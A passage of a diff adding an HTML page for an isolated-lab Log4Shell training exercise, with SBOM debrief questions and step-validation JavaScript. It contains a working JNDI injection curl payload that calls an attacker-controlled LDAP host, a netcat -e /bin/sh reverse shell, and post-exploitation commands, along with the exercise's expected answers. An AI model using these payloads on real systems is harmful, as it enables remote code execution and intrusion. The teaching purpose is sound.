+          <p style="margin-top:12px;">Replace <code>&lt;KALI_IP&gt;</code> with your Kali IP. Copy the base64 output.</p>
+          <p style="margin-top:8px;">We use netcat with <code>-e /bin/sh</code> because it is the most reliable reverse shell method in minimal Java containers. We base64-encode the command because JNDI paths cannot contain spaces or special characters.</p>
+          <p style="margin-top:12px;">Now fire the payload. Replace all three placeholders with your actual values:</p>
+          <pre><code><span class="comment"># Replace &lt;TARGET_IP&gt;, &lt;KALI_IP&gt;, and &lt;BASE64&gt; with your values</span>
+curl http://&lt;TARGET_IP&gt;:8080 \
+  -H 'X-Api-Version: ${jndi:ldap://&lt;KALI_IP&gt;:1389/Basic/Command/Base64/&lt;BASE64&gt;}'</code></pre>
+          <p style="margin-top:10px; color:var(--muted);">
+            <code>&lt;TARGET_IP&gt;</code> — the vulnerable VM's IP address.<br>
+            <code>&lt;KALI_IP&gt;</code> — your Kali machine's IP address.<br>
+            <code>&lt;BASE64&gt;</code> — the output of the echo command above.
+          </p>
+        </div>
+
+        <div class="phase-block">
+          <h3><span class="phase-badge badge-verify">Watch</span> What happens next</h3>
+          <ul class="flat-list">
+            <li><strong>Terminal 1 (JNDIExploit):</strong> You will see <code>[+] Received LDAP Query</code>, then <code>[+] New HTTP Request</code>, then <code>[+] Receive ClassRequest</code> and <code>[+] Response Code: 200</code>. This confirms the target JVM fetched and executed the malicious class.</li>
+            <li><strong>Terminal 2 (netcat):</strong> A shell prompt appears. You are now inside the target container. You have remote code execution.</li>
+            <li><strong>Terminal 3 (curl):</strong> The curl command will hang — this is normal. The action is in the other two terminals.</li>
+          </ul>
+        </div>
+
+        <div class="phase-block">
+          <h3><span class="phase-badge badge-verify">Shell</span> Commands to run once you have the shell</h3>
+          <pre><code><span class="comment"># Prove code execution — read the flag</span>
+cat /flags/app_flag.txt
+
+<span class="comment"># Find the Log4j jar — this is the SBOM artifact</span>
+find / -name 'log4j*.jar' 2>/dev/null
+
+<span class="comment"># See what user you are running as</span>
+whoami &amp;&amp; id
+
+<span class="comment"># What is running in this container?</span>
+ps aux
+
+<span class="comment"># What can this container reach on the network?</span>
+ip a &amp;&amp; cat /etc/hosts</code></pre>
+          <p style="margin-top:12px; color:var(--muted);">The <code>find / -name 'log4j*.jar'</code> command is the SBOM money shot. The jar you find on disk is exactly what a Software Bill of Materials would have listed before this vulnerability was ever disclosed — and what would have given defenders time to patch before you got here.</p>
+        </div>
+
+        <div class="task-card" style="margin-top:24px;">
+          <label for="shell-flag">Paste the flag you recovered from inside the container.</label>
+          <input id="shell-flag" type="text" placeholder="FLAG{...}">
+          <p class="placeholder-hint">The flag is at /flags/app_flag.txt inside the container. Read it with cat and paste the exact value here.</p>
+        </div>
+      </section>
+
+      <!-- STEP 7: DEBRIEF -->
+      <section class="panel-step" data-step="7">
+        <div class="jump-banner" id="jump-7"></div>
+        <p class="eyebrow">Step 8</p>
+        <h2>Debrief</h2>
+        <p>
+          You have completed the full attack chain. Take a few minutes to consolidate what you observed and what it means from both the attacker and defender perspective.
+        </p>
+
+        <div class="summary-card" id="summary-card"></div>
+
+        <div class="task-card">
+          <h3>The SBOM argument</h3>
+          <p>
+            The Log4j jar you found on disk is a transitive dependency — the developers did not explicitly choose Log4j. It was pulled in automatically by Spring Boot's logging starter. Without an SBOM, there was no inventory of what was actually running inside the application. With an SBOM, Log4j 2.14.1 would have appeared as a known component before CVE-2021-44228 was published — and the patch would have been applied before attackers arrived.
+          </p>
+        </div>
+
+        <div class="task-card">
+          <label for="sbom-reflection">What would an SBOM have shown, and when would it have been actionable?</label>
+          <textarea id="sbom-reflection" class="large" placeholder="Example: An SBOM generated at build time would have listed log4j-core 2.14.1 as a dependency. When CVE-2021-44228 was disclosed on December 9, 2021, any organization with an SBOM could have immediately queried it to find all affected services — rather than manually auditing every application over days or weeks while attackers were actively exploiting."></textarea>
+          <p class="placeholder-hint">Reference the specific jar version and explain when in the vulnerability lifecycle an SBOM would have changed the outcome.</p>
+
+          <label for="service3-why-safe">Explain in your own words why the service on port 8003 was not vulnerable.</label>
+          <textarea id="service3-why-safe" class="large" placeholder="Example: The service on 8003 is a Python Flask application. Log4j is a Java logging library — it cannot exist in a Python application. Even though the service accepts user input, that input is processed by Python's logging module, not Log4j. The Server header revealed the Python/Werkzeug framework."></textarea>
+          <p class="placeholder-hint">Be specific about why accepting user input alone is not enough to create a Log4Shell vulnerability.</p>
+
+          <label for="injection-comparison">How was the injection point on port 8080 different from 8001 and 8002? Why does this matter?</label>
+          <textarea id="injection-comparison" class="large" placeholder="Example: Services on 8001 and 8002 used form fields and query parameters as injection points. The service on 8080 used an HTTP request header (X-Api-Version). This shows that Log4Shell can fire from any input passed to logger.info(). Headers are often overlooked during security testing because they are not visible in browser forms — an attacker familiar with Log4Shell would test all inputs."></textarea>
+          <p class="placeholder-hint">Think about what a defender should test, and what an attacker looks for beyond obvious form fields.</p>
+        </div>
+
+        <div class="checkpoint">
+          <label class="checkbox-row" for="lab-only-confirmation">
+            <input id="lab-only-confirmation" type="checkbox">
+            <span>I performed all exploitation steps only inside the approved isolated lab environment, against services confirmed during reconnaissance, and I understand that these techniques must not be used outside of authorized engagements.</span>
+          </label>
+        </div>
+      </section>
+
+      <footer class="panel-footer">
+        <button class="secondary" id="prev-step" type="button">Back</button>
+        <div class="footer-meta">
+          <p>Training mode only — isolated classroom lab environment.</p>
+          <div id="validation-message" aria-live="polite"></div>
+        </div>
+        <button class="primary" id="next-step" type="button">Next →</button>
+      </footer>
+    </section>
+  </main>
+
+  <script>
+    const steps = Array.from(document.querySelectorAll(".panel-step"));
+    const stepItems = Array.from(document.querySelectorAll(".step-item"));
+    const progressFill = document.getElementById("progress-fill");
+    const progressCopy = document.getElementById("progress-copy");
+    const nextButton = document.getElementById("next-step");
+    const prevButton = document.getElementById("prev-step");
+    const summaryCard = document.getElementById("summary-card");
+    const validationMessage = document.getElementById("validation-message");
+
+    let currentStep = 0;
+    let maxStep = 0; // highest step legitimately reached
+
+    const portInputs = [
+      document.getElementById("port-1"),
+      document.getElementById("port-2"),
+      document.getElementById("port-3"),
+      document.getElementById("port-4"),
+    ];
+
+    const mappingFields = [
+      { route: document.getElementById("svc1-path") },
+      { route: document.getElementById("svc2-path") },
+      { assessment: document.getElementById("svc3-assessment"), notes: document.getElementById("svc3-notes") },
+    ];
+
+    function normalize(v) { return v.trim().toLowerCase(); }
+    function getValue(el) { return el ? el.value.trim() : ""; }
+
+    function showValidationMessage(message, isError = false) {
+      validationMessage.textContent = message;
+      validationMessage.className = message ? (isError ? "error" : "success") : "";
+    }
+
+    function updateJumpBanners() {
+      for (let i = 0; i < steps.length; i++) {
+        const banner = document.getElementById(`jump-${i}`);
+        if (!banner) continue;
+        if (i === currentStep && maxStep > currentStep) {
+          banner.className = "jump-banner visible";
+          banner.innerHTML = `
+            <span>You have already completed up to Step ${maxStep + 1}.</span>
+            <button class="jump-btn" onclick="jumpToMax()">Jump to Step ${maxStep + 1} →</button>
+          `;
+        } else {
+          banner.className = "jump-banner";
+          banner.innerHTML = "";
+        }
+      }
+    }
+
+    window.jumpToMax = function() {
+      currentStep = maxStep;
+      updateUI();
+    };
+
+    function updateSidebarLocks() {
+      stepItems.forEach((item, index) => {
+        item.classList.toggle("active", index === currentStep);
+        item.classList.toggle("complete", index < currentStep);
+        if (index <= maxStep) {
+          item.classList.remove("locked");
+        } else {
+          item.classList.add("locked");
+        }
+      });
+    }
+
+    function updateUI() {
+      steps.forEach((step, index) => {
+        step.classList.toggle("active", index === currentStep);
+      });
+
+      updateSidebarLocks();
+      updateJumpBanners();
+
+      const progress = ((maxStep + 1) / steps.length) * 100;
+      progressFill.style.width = `${progress}%`;
+      progressCopy.textContent = `Step ${currentStep + 1} of ${steps.length}`;
+
+      prevButton.disabled = currentStep === 0;
+      nextButton.textContent = currentStep === steps.length - 1 ? "Restart" : "Next →";
+      showValidationMessage("");
+
+      if (currentStep === steps.length - 1) renderSummary();
+    }
+
+    function validateStep(index) {
+      // Step 1: port discovery
+      if (index === 1) {
+        const ports = portInputs.map(getValue).filter(Boolean);
+        const required = ["8001", "8002", "8003", "8080"];
+        const missing = required.filter(p => !ports.includes(p));
+        if (ports.length < 4 || missing.length > 0) {
+          showValidationMessage("Not quite — recheck your nmap results. You should find four open application ports.", true);
+          return false;
+        }
+        showValidationMessage("All four ports identified. Continue to application mapping.");
+      }
+
+      // Step 2: application mapping
+      if (index === 2) {
+        const svc1ok = normalize(getValue(mappingFields[0].route)) === "/login";
+        const svc2ok = normalize(getValue(mappingFields[1].route)) === "/search";
+        const svc3ok = getValue(mappingFields[2].assessment) === "No";
+        const svc3notes = getValue(mappingFields[2].notes).length > 1;
+
+        if (!svc1ok || !svc2ok || !svc3ok || !svc3notes) {
+          showValidationMessage("Mapping incomplete — recheck your curl results for each service.", true);
+          return false;
+        }
+        showValidationMessage("Correct mapping. Continue to the probing plan.");
+      }
+
+      // Step 4: recon confirmation
+      if (index === 4) {
+        const checked = document.getElementById("confirmed-log4j").checked;
+        const hasOutput = getValue(document.getElementById("recon-output")).length > 1;
+        if (!checked || !hasOutput) {
+          showValidationMessage("Paste the recon script output and confirm the callback results before continuing.", true);
+          return false;
+        }
+        showValidationMessage("Recon confirmed. Continue to the exploit script.");
+      }
+
+      // Step 6: reverse shell — flag only
+      if (index === 6) {
+        const flag = getValue(document.getElementById("shell-flag"));
+        if (!flag) {
+          showValidationMessage("Paste the flag recovered from inside the container to continue.", true);
+          return false;
+        }
+        showValidationMessage("Reverse shell complete. Continue to debrief.");
+      }
+
+      // Step 7: debrief
+      if (index === 7) {
+        const checked = document.getElementById("lab-only-confirmation").checked;
+        const sbom = getValue(document.getElementById("sbom-reflection")).length > 1;
+        const safe = getValue(document.getElementById("service3-why-safe")).length > 1;
+        const compare = getValue(document.getElementById("injection-comparison")).length > 1;
+
+        if (!checked || !sbom || !safe || !compare) {
+          showValidationMessage("Complete all reflection questions and confirm the lab ethics checkbox to finish.", true);
+          return false;
+        }
+        showValidationMessage("Exercise complete. Well done.");
+      }
+
+      return true;
+    }
+
+    function renderSummary() {
+      const operator = getValue(document.getElementById("operator-name")) || "Anonymous";
+      const ports = portInputs.map(getValue).filter(Boolean).join(", ") || "not recorded";
+      const svc1 = getValue(mappingFields[0].route) || "not mapped";
+      const svc2 = getValue(mappingFields[1].route) || "not mapped";
+      const svc3 = getValue(mappingFields[2].assessment) || "not assessed";
+      const flag = getValue(document.getElementById("shell-flag")) || "not recovered";
+
+      summaryCard.innerHTML = `
+        <h3>Operator Summary — ${operator}</h3>
+        <ul>
+          <li><strong>Ports discovered:</strong> ${ports}</li>
+          <li><strong>Auth service (8001) route:</strong> ${svc1}</li>
+          <li><strong>Inventory service (8002) route:</strong> ${svc2}</li>
+          <li><strong>Status service (8003) — Log4j target?</strong> ${svc3}</li>
+          <li><strong>Flag recovered from 8080:</strong> ${flag}</li>
+        </ul>
+      `;
+    }
+
+    nextButton.addEventListener("click", () => {
+      if (currentStep === steps.length - 1) {
+        currentStep = 0;
+        updateUI();
+        return;
+      }
+      if (!validateStep(currentStep)) return;
+      currentStep += 1;
+      if (currentStep > maxStep) maxStep = currentStep;
+      updateUI();
+    });
+
+    prevButton.addEventListener("click", () => {
+      if (currentStep > 0) {
+        currentStep -= 1;
+        updateUI();
+      }
+    });
+
+    stepItems.forEach((item) => {
+      item.addEventListener("click", () => {
+        const target = parseInt(item.dataset.step);
+        if (target <= maxStep) {
+          currentStep = target;
+          updateUI();
+        }
+      });
+    });
+
+    updateUI();
+  </script>
+</body>
+</html>
